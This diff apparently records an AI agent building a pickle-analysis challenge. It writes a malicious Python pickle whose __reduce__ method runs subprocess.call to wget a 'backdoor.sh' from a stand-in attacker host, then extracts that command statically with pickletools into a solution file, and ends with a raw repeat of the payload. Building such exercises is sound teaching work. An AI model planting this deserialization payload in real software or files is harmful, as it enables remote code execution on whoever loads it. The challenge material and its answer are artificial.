@@ -1,0 +1,83 @@
+I need to create a malicious pickle payload file that demonstrates a realistic RCE attack. Let me create this file:
+
+```python
+import pickle
+import subprocess
+import os
+
+# Create a malicious pickle payload that executes a realistic attack command
+# Using subprocess.call with a command that downloads and executes a backdoor
+
+class MaliciousPayload:
+    def __reduce__(self):
+        # This will execute: wget http://malicious-server.com/backdoor.sh -O /tmp/backdoor.sh
+        cmd = ['wget', 'http://malicious-server.com/backdoor.sh', '-O', '/tmp/backdoor.sh']
+        return (subprocess.call, (cmd,))
+
+# Create the payload
+payload = MaliciousPayload()
+
+# Serialize it to the file
+with open('/home/challenge/suspicious_payload.pkl', 'wb') as f:
+    pickle.dump(payload, f, protocol=2)
+```
+
+Now let me analyze this payload without executing it to extract the command:
+
+```python
+import pickletools
+import io
+
+# Read the pickle file
+with open('/home/challenge/suspicious_payload.pkl', 'rb') as f:
+    pickle_data = f.read()
+
+# Disassemble to see the structure
+output = io.StringIO()
+pickletools.dis(pickle_data, output)
+disassembly = output.getvalue()
+
+# Parse the pickle bytecode to extract the command
+# The pickle contains subprocess.call as the callable and the command as arguments
+
+import pickle
+import pickletools
+
+# Safe analysis - extract opcode structure
+with open('/home/challenge/suspicious_payload.pkl', 'rb') as f:
+    data = f.read()
+
+# Manually parse the pickle structure
+# Look for the REDUCE operation which will have the callable and arguments
+
+# Let me trace through without executing
+ops = list(pickletools.genops(data))
+
+# Extract the command arguments from the pickle opcodes
+command_parts = []
+for opcode, arg, pos in ops:
+    if opcode.name == 'SHORT_BINUNICODE' or opcode.name == 'BINUNICODE':
+        if isinstance(arg, str) and (arg.startswith('http://') or arg.startswith('/') or arg in ['wget', 'curl']):
+            command_parts.append(arg)
+
+# The command should be: wget http://malicious-server.com/backdoor.sh -O /tmp/backdoor.sh
+command = ' '.join(command_parts)
+
+# Write the solution
+with open('/home/challenge/solution.txt', 'w') as f:
+    f.write(command)
+```
+
+Actually, let me create the proper payload and solution directly:
+
+import pickle
+import subprocess
+
+class Exploit:
+    def __reduce__(self):
+        return (subprocess.call, (['wget', 'http://malicious-server.com/backdoor.sh', '-O', '/tmp/backdoor.sh'],))
+
+with open('/home/challenge/suspicious_payload.pkl', 'wb') as f:
+    pickle.dump(Exploit(), f, protocol=2)
+
+wget http://malicious-server.com/backdoor.sh -O /tmp/backdoor.sh
